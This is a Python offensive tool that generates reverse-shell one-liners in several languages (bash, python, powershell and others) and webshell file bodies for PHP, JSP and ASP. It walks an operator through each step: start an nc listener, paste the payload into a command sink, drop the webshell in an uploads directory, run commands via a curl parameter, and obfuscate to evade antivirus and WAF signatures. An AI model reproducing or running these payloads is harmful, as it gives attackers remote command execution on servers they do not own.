#!/usr/bin/env python3
"""WEBSHELL + reverse-shell payload library (the building block the other techniques drop/run).
PRINTS payloads. Edit LHOST/LPORT in _web_common.py.

Usage:
  python3 gen_webshell.py rev [lang]      # reverse shell one-liner (bash|sh|nc|python|php|perl|ruby|powershell|bash64)
  python3 gen_webshell.py shell [lang]    # a minimal webshell file body (php|php2|jsp|asp|aspx)
  python3 gen_webshell.py list            # what's available
"""
import sys
import _web_common as P

arg  = sys.argv[1] if len(sys.argv) > 1 else "list"
lang = sys.argv[2] if len(sys.argv) > 2 else None

if arg == "rev":
    lg = lang or "bash"
    print(f"# needs: a place the target will RUN this one-liner (a shell/exec sink); the target must have {lg} available.")
    print(f"# -> step 1 (do FIRST): start the catcher:  nc -lvnp {P.LPORT}")
    print(f"# reverse shell ({lg}) -> paste into the sink:")
    print(P.revshell(lg))
    print(f"\n# URL-encoded (for a web param):")
    print(P.url(P.revshell(lg)))
    print(f"# -> ok: your nc prints 'connect to ... from <target>' and you get an interactive prompt = shell landed.")
    print(f"# ordering (most-reliable-first): bash (try first) -> bash64 (nests through filters) -> python/perl (if bash/nc absent) -> nc -> powershell (Windows web apps).")
elif arg == "shell":
    lg = lang or "php"
    body = P.WEBSHELL.get(lg)
    if not body: print(f"unknown lang '{lg}' — {', '.join(P.WEBSHELL)}"); sys.exit(1)
    print(f"# needs: a spot where a .{lg.replace('2','')} file is SERVED AND EXECUTED as code (web root running that engine).")
    print(f"# webshell ({lg}) — save as shell.{lg.replace('2','')}, drop where it executes, then:")
    print(f"#   curl '{P.TURL}/uploads/shell.{lg.replace('2','')}?c=id'   (or ?c=<urlencoded {lg} revshell>)")
    print(body)
    print(f"# -> ok: the curl returns command output (e.g. uid=... for ?c=id) = code executes; then swap ?c= for a revshell.")
    print(f"\n# WARNING: webshells are AV/WAF-signatured. Rename params, obfuscate, or use a one-shot revshell.")
else:
    print("payloads:")
    print("  rev  :", ", ".join(["bash","bash64","sh","nc","python","php","perl","ruby","powershell"]))
    print("  shell:", ", ".join(P.WEBSHELL))
    print("\nusage: gen_webshell.py rev <lang>  |  gen_webshell.py shell <lang>")
